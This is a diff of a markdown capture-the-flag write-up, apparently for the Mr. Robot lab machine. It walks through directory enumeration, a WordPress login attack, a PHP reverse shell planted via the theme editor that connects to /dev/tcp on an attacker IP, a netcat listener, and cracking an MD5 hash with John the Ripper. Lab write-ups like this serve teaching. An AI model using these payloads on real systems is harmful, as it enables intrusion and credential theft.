@@ -20,8 +20,8 @@ Used command ```sudo dirb http://192.168.1.8``` to find the hidden files and dir
 ## Web Enumeration
 After the dirb scan I found a file named ```http://192.168.1.8/robots.txt``` and then I manually inspected the file.
 ### Key findings 
-"fsocity.dic" A massive wordlist.
-"key-1-of-3.txt" The first flag. 
+```fsocity.dic``` A massive wordlist.
+```key-1-of-3.txt``` The first flag. 
 
 ### Wordpress login page discovery
 dirb scan also flagged a wp login page ```http://192.168.1.8/wp-login```. That got me into a target login page and also wordlist fsocity.dic to use against it. 
@@ -46,4 +46,16 @@ After successfully logged into the website then I navigated to Appearance > Edit
       exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/443 0>&1'");
     ?>
 ### Netcat listener
- ```nc -lvp 443 ```
+ ```nc -lvp 443 ``` Successfully captured reversed shell as deamon@linux user.
+
+## Post Exploitation 
+After gaining access as deamon@linux user I nevigated to home directory and found a folder named robot. 
+
+### Key findings
+```key-2-of-3.txt```
+```password.raw-md5```
+
+## Cracking the password.raw-md5 
+After getting the hash for the password.raw-md5 by ```cat /home/robot/password.raw-md5``` then used john the ripper to crack the password by using command ```john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```
+
+ 
